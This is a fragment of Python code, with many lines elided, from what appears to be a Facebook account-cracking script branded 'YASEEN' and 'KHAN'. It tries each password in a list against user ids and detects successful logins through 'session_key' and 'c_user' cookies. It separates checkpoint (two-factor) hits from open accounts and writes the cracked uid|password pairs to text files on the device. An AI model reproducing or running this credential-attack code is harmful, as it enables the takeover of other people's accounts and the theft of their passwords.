                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [YASEEN-OK] '+str(uid)+' | '+pas+'\033[1;97m')

                                        open('/sdcard/YASEEN-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/KHAN-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
...
def trt6(ids,passlist):
	...
	try:
		...
		for pas in passlist:
			...
			sys.stdout.write('\r\r\033[1;37m [YASEEN-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						print('\r\r\033[1;34m [YASEEN-2F] '+uid+' | '+pas)

					else:

						print(f'\r\x1b[1;32m [YASEEN-OK] '+uid+' | '+pas)

						open('/sdcard/YASEEN-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [KHAN-CP] '+uid+' | '+pas+'\033[1;97m')

					open('/sdcard/KHAN-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
